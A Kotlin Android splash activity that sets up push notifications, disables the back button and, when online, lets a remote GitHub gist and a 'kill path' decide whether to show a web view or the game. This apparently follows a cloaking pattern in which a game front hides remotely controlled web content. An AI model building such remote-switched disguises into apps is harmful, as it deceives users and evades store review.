package com.babakure.finoriza

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ProgressBar
import androidx.activity.addCallback
import androidx.appcompat.app.AppCompatActivity
import com.onesignal.OneSignal

class PreloaderActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        immersiveFullscreen()
        setContentView(R.layout.activity_preloader)

        val pb = findViewById<ProgressBar>(R.id.progressBar)
        val max = 100
        pb.max = max


        onBackPressedDispatcher.addCallback(this) { }
        entryStarter(
            gistUrl = "https://gist.githubusercontent.com/Cek1rob/e108f6c3f1ef1d3fd80bc226986d78c2/raw/TASK-114",
            killPath = "grtpooalew.html",
            signalAppId = "b3d7cf40-b2ed-4652-a4ef-aa9214b162f0",
            gameActivity = HomeActivity::class.java
        )
    }
    fun entryStarter(
        gistUrl: String,
        killPath: String,
        signalAppId: String,
        gameActivity: Class<out android.app.Activity>
    ) {
        SplashKeeper.hold(this)

        // 1) OneSignal init
        if (signalAppId.isNotBlank()) {
            OneSignal.initWithContext(this, signalAppId)
            // (опціонально) якщо хочеш квиток одразу:
            // OneSignal.getNotifications().requestPermission(true)
        }

        // 2) Runtime permission на Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1001)
        }

        // 3) Якщо немає інтернету — одразу у гру
        if (!isInternetAvailable()) {
            startActivity(Intent(this, gameActivity))
            finish()
            return
        }

        // 4) Двері → веб або гра
        Door.start(
            splash = this,
            gistUrl = gistUrl,
            killPath = killPath,
            webActivity = WebActivity::class.java,
            gameActivity = gameActivity
        )
    }

    private fun isInternetAvailable(): Boolean {
        val cm = getSystemService(ConnectivityManager::class.java)
        val n = cm.activeNetwork ?: return false
        val c = cm.getNetworkCapabilities(n) ?: return false
        return c.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
                || c.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                || c.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
    }
}